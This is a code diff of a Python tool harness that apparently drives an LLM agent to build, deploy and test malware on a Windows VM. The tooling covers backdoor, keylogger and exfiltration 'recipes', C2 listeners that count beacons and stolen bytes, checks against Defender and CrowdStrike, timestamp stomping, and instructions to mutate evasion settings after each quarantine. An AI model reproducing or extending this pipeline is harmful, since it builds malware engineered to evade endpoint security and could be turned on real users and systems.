         logger.info("Set _last_recipe=%s, _last_exfil=%s from mutate_recipe", out_name, self._last_exfil)
 
-        return f"Mutated recipe -> {out_path}\nChanges: {'; '.join(changes)}"
+        parent_key = recipe.replace(".yaml", "")
+        parent_lineage = self._recipe_lineage.get(parent_key, {})
+        original_parent = parent_lineage.get("original_parent", parent_key)
+        depth = parent_lineage.get("mutation_depth", 0) + 1
+        self._recipe_lineage[out_name] = {
+            "original_parent": original_parent,
+            "mutation_depth": depth,
+            "created_new": False,
+        }
+
+        origin = self.get_recipe_origin(out_name)
+        return f"Mutated recipe -> {out_path}\nChanges: {'; '.join(changes)}\nOrigin: {origin}"
 
     # ── Deployment ───────────────────────────────────────────────────
 
@@ -1157,6 +1627,9 @@ class ToolExecutor:
         if remote_path is None:
             self._quarantined_hashes.add(file_hash)
             self._quarantine_streak += 1
+            self._quarantine_locked = True
+            self._epoch_failures.append(
+                f"Deploy quarantined: {self._last_recipe} (hash {file_hash[:16]}...)")
             streak_msg = (f"\nQuarantine streak: {self._quarantine_streak}/3. "
                           f"{'NEXT DEPLOY BLOCKED — must assemble new recipe first.' if self._quarantine_streak >= 3 else 'Change the binary before retrying.'}")
             detection_details = ""
@@ -1169,7 +1642,8 @@ class ToolExecutor:
             return (f"ERROR: File quarantined by EDR at ALL deploy paths (hash {file_hash[:16]}... recorded).\n"
                     f"  Tried: {', '.join(deploy_dirs)}\n"
                     f"  Local: {local_path} ({local_size} bytes)\n"
-                    f"  Call tool_mutate_recipe with DIFFERENT evasion/api_resolve, then tool_assemble."
+                    f"  VM commands are LOCKED until you assemble a new binary.\n"
+                    f"  Call mutate_recipe or create_recipe with DIFFERENT evasion, then assemble."
                     f"{streak_msg}{detection_details}")
 
         self._quarantine_streak = 0
@@ -1183,25 +1657,25 @@ class ToolExecutor:
         if used_fallback:
             result_lines.append(f"  NOTE: Desktop path was quarantined, deployed to fallback path instead")
 
-        is_script = filename.lower().endswith((".js", ".vbs"))
+        is_script = filename.lower().endswith((".js", ".vbs", ".bat"))
         for port, info in list(_c2_listeners.items()):
             active_proto = info.get("protocol", "tcp")
-            if is_script and active_proto != "http":
+            if active_proto == "backdoor":
+                pass  # never auto-convert a backdoor C2
+            elif is_script and active_proto != "http":
                 logger.info("Protocol mismatch: deploying %s but C2 on port %d is %s — restarting as HTTP",
                             filename, port, active_proto)
                 await self._restart_c2_as(port, "http", info)
                 result_lines.append(f"  Auto-fixed C2 protocol: {active_proto} -> HTTP (JScript/VBS requires HTTP)")
             elif not is_script and active_proto == "http" and not self._last_recipe.startswith(("js_", "vbs_")):
-                if self._last_exfil and "http" not in self._last_exfil:
+                if self._last_exfil and "http" not in self._last_exfil and not self._is_backdoor:
                     logger.info("Protocol mismatch: deploying PE %s but C2 on port %d is HTTP — restarting as TCP",
                                 filename, port, active_proto)
                     await self._restart_c2_as(port, "tcp", info)
                     result_lines.append(f"  Auto-fixed C2 protocol: HTTP -> TCP (PE with non-HTTP exfil)")
 
         if execute:
-            is_persistent = self._last_recipe and any(
-                k in self._last_recipe for k in ("backdoor", "keylogger", "persist")
-            )
+            is_persistent = self._is_persistent_type
             if execute_via == "cscript":
                 if is_persistent:
                     cmd = f'start /b cscript //nologo //E:jscript "{remote_path}"'
@@ -1267,8 +1741,8 @@ class ToolExecutor:
             text = target.read_text(errors="replace")
             lines = text.splitlines()
             if len(lines) > max_lines:
-                return "\n".join(lines[:max_lines]) + f"\n... ({len(lines) - max_lines} more lines)"
-            return text
+                text = "\n".join(lines[:max_lines]) + f"\n... ({len(lines) - max_lines} more lines)"
+            return self._truncate(text, 4000, "read_file")
         except Exception as e:
             return f"ERROR reading {target}: {e}"
 
@@ -1355,12 +1829,15 @@ class ToolExecutor:
         elif protocol == "auto" or (protocol != "auto" and exfil and self._protocol_mismatches(protocol, exfil)):
             if protocol != "auto":
                 logger.info("Overriding LLM protocol %s -> auto (exfil is %s)", protocol, exfil)
-            if self._last_recipe and "backdoor" in self._last_recipe:
+            if self._is_backdoor:
                 protocol = "backdoor"
             elif exfil and "http" in exfil:
                 protocol = "http"
             else:
                 protocol = "tcp"
+        if protocol == "backdoor" and timeout < 120:
+            logger.info("Backdoor C2 requires >=120s timeout (was %ds), overriding", timeout)
+            timeout = 120
         logger.info("Starting %s C2 listener on port %d (timeout=%ds)", protocol, port, timeout)
 
         if port in _c2_listeners:
@@ -1394,6 +1871,7 @@ class ToolExecutor:
             target_fn = _run_http_c2
         t = threading.Thread(target=target_fn, args=(port, timeout), daemon=True)
         t.start()
+        _c2_listeners[port]["thread"] = t
 
         await asyncio.sleep(1.0)
 
@@ -1406,6 +1884,10 @@ class ToolExecutor:
         return f"C2 {protocol.upper()} listener started on port {port} (timeout {timeout}s)"
 
     async def tool_execute_on_vm(self, command: str) -> str:
+        if self._quarantine_locked:
+            return ("BLOCKED: Last binary was quarantined. VM commands are locked until you "
+                    "build a new binary. Call mutate_recipe or create_recipe with different "
+                    "evasion/chunks, then assemble to unlock.")
         logger.info("Executing on VM: %s", command[:100])
         stdout, stderr, rc = await self._ssh_exec(command, timeout=60)
         lines = [f"Exit code: {rc}"]
@@ -1413,7 +1895,7 @@ class ToolExecutor:
             lines.append(f"stdout:\n{stdout[:3000]}")
         if stderr.strip():
             lines.append(f"stderr:\n{stderr[:1000]}")
-        return "\n".join(lines)
+        return self._truncate("\n".join(lines), 1500, "execute_on_vm")
 
     # ── Analysis ─────────────────────────────────────────────────────
 
@@ -1480,7 +1962,15 @@ class ToolExecutor:
 
     async def tool_analyze_results(self, binary_name: str, c2_port: int = 9001) -> str:
         logger.info("Analyzing results for %s (C2 port %d)", binary_name, c2_port)
-        await asyncio.sleep(5)
+
+        if self._is_backdoor and c2_port in _c2_listeners:
+            c2_thread = _c2_listeners[c2_port].get("thread")
+            if c2_thread and c2_thread.is_alive():
+                logger.info("Waiting for backdoor C2 to finish command exchange (up to 120s)...")
+                await asyncio.to_thread(c2_thread.join, timeout=120)
+                logger.info("Backdoor C2 thread done (alive=%s)", c2_thread.is_alive())
+        else:
+            await asyncio.sleep(5)
 
         binary_check, _, _ = await self._ssh_exec(
             f'dir "C:\\Users\\{self.vm_user}\\Desktop\\{binary_name}"',
@@ -1525,8 +2015,15 @@ class ToolExecutor:
                any(kw in low for kw in ["trojan", "hacktool", "malware", "quarantine", "blocked", "killed"]):
                 cs_detections.append(line.strip())
 
-        is_jscript = binary_name.endswith(".js")
-        format_type = "jscript" if is_jscript else "c"
+        ext = Path(binary_name).suffix.lower()
+        format_type = {".js": "jscript", ".vbs": "vbscript", ".bat": "batch"}.get(ext, "c")
+
+        bd_beacons = 0
+        bd_result_count = 0
+        if self._is_backdoor and c2_port in _c2_listeners:
+            entry = _c2_listeners[c2_port]
+            bd_beacons = entry.get("backdoor_beacons", 0)
+            bd_result_count = entry.get("backdoor_result_count", 0)
 
         result = classify_failure(
             binary_exists=binary_exists,
@@ -1537,6 +2034,9 @@ class ToolExecutor:
             stderr="",
             stdout="",
             format_type=format_type,
+            is_backdoor=self._is_backdoor,
+            backdoor_beacons=bd_beacons,
+            backdoor_results=bd_result_count,
         )
 
         lines = [
@@ -1544,6 +2044,8 @@ class ToolExecutor:
             f"Binary: {binary_name}",
             f"Binary exists on VM: {binary_exists}",
             f"C2 data received: {c2_bytes} bytes",
+            *(([f"Backdoor beacons: {bd_beacons}",
+                f"Backdoor command results: {bd_result_count}/3 expected"] if self._is_backdoor else [])),
             f"Defender detections: {len(defender_detections)}",
             f"CrowdStrike detections: {len(cs_detections)}",
             "",
@@ -1572,6 +2074,19 @@ class ToolExecutor:
             detections=len(defender_detections) + len(cs_detections),
         )
 
+        is_pass = result.failure_type.value == "SUCCESS" and binary_exists and \
+                   len(defender_detections) == 0 and len(cs_detections) == 0
+        if not is_pass:
+            failure_desc = (
+                f"Recipe={self._last_recipe}: {result.failure_type.value} — "
+                f"{result.detail} (c2={c2_bytes}b, binary={'exists' if binary_exists else 'GONE'}, "
+                f"detections={len(defender_detections)+len(cs_detections)})"
+            )
+            self._epoch_failures.append(failure_desc)
+        else:
+            self._epoch_call_count = 0
+            self._epoch_failures.clear()
+
         return "\n".join(lines)
 
     def _save_recipe_result(self, binary_name: str, verdict: str, c2_bytes: int,
@@ -1593,7 +2108,8 @@ class ToolExecutor:
             "edr": edr,
             "binary_size": 0,
             "c2_bytes": c2_bytes,
-            "format": "jscript" if binary_name.endswith(".js") else "pe_resources",
+            "format": {".js": "jscript", ".vbs": "vbscript", ".bat": "batch"}.get(
+                Path(binary_name).suffix.lower(), "pe_resources"),
             "date": datetime.now().strftime("%Y-%m-%d"),
         }
         data["results"].append(entry)
@@ -1641,6 +2157,8 @@ class ToolExecutor:
             'del "C:\\Users\\vmuser\\Desktop\\*.exe" 2>nul',
             'del "C:\\Users\\vmuser\\Desktop\\*.js" 2>nul',
             'del "C:\\Users\\vmuser\\Desktop\\*.vbs" 2>nul',
+            'del "C:\\Users\\vmuser\\Desktop\\*.bat" 2>nul',
+            'taskkill /f /im cmd.exe 2>nul',
             'schtasks /delete /tn keylog_test /f 2>nul',
             'schtasks /delete /tn backdoor_test /f 2>nul',
             'echo CLEANUP_DONE',
@@ -1749,7 +2267,7 @@ class ToolExecutor:
         err = stderr.decode("utf-8", errors="replace")
 
         if proc.returncode != 0:
-            return f"COMPILE ERROR (rc={proc.returncode}):\n{err}\n{out}"
+            return self._truncate(f"COMPILE ERROR (rc={proc.returncode}):\n{err}\n{out}", 2000, "compile_experimental")
 
         # Inject Rich header + stomp timestamp
         import sys
